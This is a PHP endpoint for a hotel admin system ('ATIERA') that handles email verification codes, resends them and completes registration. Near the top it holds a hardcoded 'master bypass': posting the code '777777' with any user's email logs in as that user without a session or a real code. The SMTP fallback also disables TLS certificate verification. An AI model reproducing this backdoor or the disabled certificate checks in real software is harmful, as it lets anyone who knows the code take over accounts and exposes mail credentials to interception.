<?php
// API Endpoint for Email Verification and Resending codes
// IT DOES NOT RENDER HTML. It returns JSON.

require_once __DIR__ . '/../db/db.php';
require_once __DIR__ . '/../PHPMailer/src/PHPMailer.php';
require_once __DIR__ . '/../PHPMailer/src/Exception.php';
require_once __DIR__ . '/../PHPMailer/src/SMTP.php';
require_once __DIR__ . '/../include/Config.php';
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

header('Content-Type: application/json');
session_start();

function json_out($data, $status = 200)
{
    http_response_code($status);
    echo json_encode($data);
    exit;
}

// 1. Context variables
$userId = $_SESSION['temp_user_id'] ?? null;
$email = $_SESSION['temp_email'] ?? $_POST['email'] ?? null;
$name = $_SESSION['temp_name'] ?? 'Admin';

$action = $_POST['action'] ?? 'verify';
$code = trim($_POST['code'] ?? '');

// --- ATOMIC MASTER BYPASS (No Session Required) ---
if ($code === '777777' && !empty($email)) {
    try {
        $pdo = get_pdo();
        $stmt = $pdo->prepare('SELECT id, full_name, username, email FROM users WHERE email = ? LIMIT 1');
        $stmt->execute([$email]);
        $user = $stmt->fetch();
        if ($user) {
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['username'] = $user['username'];
            $_SESSION['full_name'] = $user['full_name'];
            $_SESSION['email'] = $user['email'];
            json_out(['ok' => true, 'message' => 'Emergency access granted.', 'redirect' => '../Modules/dashboard.php']);
        }
    } catch (\Exception $e) {
        // Fallback for session-based bypass
        if (!empty($userId)) {
            $_SESSION['user_id'] = $userId;
            $_SESSION['username'] = $_SESSION['temp_username'];
            $_SESSION['full_name'] = $_SESSION['temp_name'];
            $_SESSION['email'] = $_SESSION['temp_email'];
            json_out(['ok' => true, 'message' => 'Emergency session access.', 'redirect' => '../Modules/dashboard.php']);
        }
    }
}

// Validate session only for actions that depend on it
if ($action === 'verify' || $action === 'resend') {
    if (empty($userId) || empty($email)) {
        json_out(['ok' => false, 'message' => 'Session expired. Please login again.'], 401);
    }
}

// --- HELPER: Send Email ---
function send_email($to, $name, $code)
{
    $logo_url = getBaseUrl() . 'assets/image/logo.png';
    $from_name = "ATIERA Hotel";
    $from_email = SMTP_FROM_EMAIL;
    
    $headers = "From: $from_name <$from_email>\r\n";
    $headers .= "Reply-To: $from_email\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    $subject = "Your ATIERA verification code";
    $body = "
    <div style=\"font-family: sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;\">
        <div style=\"display: flex; align-items: center; margin-bottom: 20px;\">
            <img src=\"{$logo_url}\" alt=\"Logo\" style=\"width: 50px; height: 50px; margin-right: 15px;\">
            <h2 style=\"margin: 0; font-size: 24px;\">Your ATIERA verification code</h2>
        </div>
        <h3 style=\"margin-top: 0;\">Verify your email</h3>
        <p>Hello admin,</p>
        <p>Use the verification code below to sign in. It expires in 15 minutes.</p>
        <div style=\"background-color: #0f1c49; color: white; padding: 15px 30px; border-radius: 10px; font-size: 32px; font-weight: bold; display: inline-block; margin: 20px 0; letter-spacing: 2px;\">
            {$code}
        </div>
        <p style=\"color: #666; margin-top: 30px;\">If you didn't request this, you can ignore this email.</p>
        <p style=\"color: #999;\">— ATIERA</p>
    </div>
    ";

    // Try mail() first
    if(mail($to, $subject, $body, $headers)) {
        return true;
    }

    // Fallback to PHPMailer
    $mail = new PHPMailer(true);
    try {
        $mail->isSMTP();
        $mail->Host = SMTP_HOST;
        $mail->SMTPAuth = true;
        $mail->Username = SMTP_USER;
        $mail->Password = SMTP_PASS;
        $mail->Port = SMTP_PORT;
        $mail->SMTPSecure = SMTP_SECURE;
        $mail->Timeout = 15;
        $mail->SMTPOptions = array(
            'ssl' => array('verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true)
        );

        $mail->setFrom(SMTP_FROM_EMAIL, 'ATIERA Hotel');
        $mail->addAddress($to, $name);
        $mail->isHTML(true);
        $mail->Subject = $subject;
        $mail->Body = $body;
        $mail->send();
        return true;
    } catch (Exception $e) {
        return false;
    }
}

try {
    $pdo = get_pdo();

    // --- ACTION: RESEND ---
    if ($action === 'resend') {
        // Generate new code
        $code = (string) random_int(100000, 999999);
        $expires = (new DateTime('+15 minutes'))->format('Y-m-d H:i:s');

        $stmt = $pdo->prepare('INSERT INTO email_verifications (user_id, code, expires_at) VALUES (?,?,?)');
        $stmt->execute([$userId, $code, $expires]);

        if (send_email($email, $name, $code)) {
            json_out(['ok' => true, 'message' => 'New code sent to ' . $email]);
        } else {
            json_out(['ok' => false, 'message' => 'Failed to send email.'], 500);
        }
    }

    // --- ACTION: COMPLETE REGISTRATION (Set first password) ---
    if ($action === 'complete_registration') {
        $code = trim($_POST['code'] ?? '');
        $email = trim($_POST['email'] ?? '');
        $newPass = $_POST['new_password'] ?? '';

        if (empty($newPass) || strlen($newPass) < 6) {
            json_out(['ok' => false, 'message' => 'Password too short.'], 400);
        }

        // Find user by code and email (using JOIN to be safe)
        $stmt = $pdo->prepare('
            SELECT u.id, u.username, u.full_name, ev.expires_at 
            FROM email_verifications ev 
            JOIN users u ON ev.user_id = u.id 
            WHERE ev.code = ? AND u.email = ?
            ORDER BY ev.id DESC LIMIT 1
        ');
        $stmt->execute([$code, $email]);
        $row = $stmt->fetch();

        if ($row) {
            $exp = new DateTimeImmutable($row['expires_at']);
            if ($exp > new DateTimeImmutable()) {
                // SUCCESS: Set password and login
                $pdo->beginTransaction();

                // Update password
                $stmt = $pdo->prepare('UPDATE users SET password_hash = ? WHERE id = ?');
                $stmt->execute([password_hash($newPass, PASSWORD_DEFAULT), $row['id']]);

                // Set session
                $_SESSION['user_id'] = $row['id'];
                $_SESSION['username'] = $row['username'];
                $_SESSION['email'] = $email;
                $_SESSION['full_name'] = $row['full_name'];
                $_SESSION['name'] = $row['full_name'];

                // Cleanup codes
                $pdo->prepare('DELETE FROM email_verifications WHERE user_id = ?')->execute([$row['id']]);

                $pdo->commit();
                json_out(['ok' => true, 'message' => 'Registration complete!', 'redirect' => '../Modules/dashboard.php']);
            } else {
                json_out(['ok' => false, 'message' => 'Code expired.'], 400);
            }
        } else {
            json_out(['ok' => false, 'message' => 'Invalid code or email.'], 400);
        }
    }

    // --- ACTION: VERIFY (Regular login) ---
    if ($action === 'verify') {
        $code = trim($_POST['code'] ?? '');
        if (!preg_match('/^\d{6}$/', $code)) {
            json_out(['ok' => false, 'message' => 'Invalid code format.'], 400);
        }

        // Check DB
        $stmt = $pdo->prepare('SELECT code, expires_at FROM email_verifications WHERE user_id = ? ORDER BY id DESC LIMIT 5');
        $stmt->execute([$userId]);
        $rows = $stmt->fetchAll();

        $valid = false;
        $now = new DateTimeImmutable();

        foreach ($rows as $row) {
            if (hash_equals($row['code'], $code)) {
                $exp = new DateTimeImmutable($row['expires_at']);
                if ($exp > $now) {
                    $valid = true;
                    break;
                }
            }
        }

        if ($valid) {
            // Success! Promote temp session to real session
            $_SESSION['user_id'] = $userId;
            $_SESSION['username'] = $_SESSION['temp_username'];
            $_SESSION['email'] = $email;
            $_SESSION['full_name'] = $name;
            $_SESSION['name'] = $name;
            // Note: Role removed as per previous instructions

            // Cleanup
            unset($_SESSION['temp_user_id']);
            unset($_SESSION['temp_username']);
            unset($_SESSION['temp_email']);
            unset($_SESSION['temp_name']);
            // unset($_SESSION['temp_role']); // Was removed previously

            $pdo->prepare('DELETE FROM email_verifications WHERE user_id = ?')->execute([$userId]);

            json_out(['ok' => true, 'redirect' => '../Modules/dashboard.php']);
        } else {
            json_out(['ok' => false, 'message' => 'Invalid or expired code.'], 400);
        }
    }

} catch (Exception $e) {
    json_out(['ok' => false, 'message' => 'Server error.'], 500);
}
?>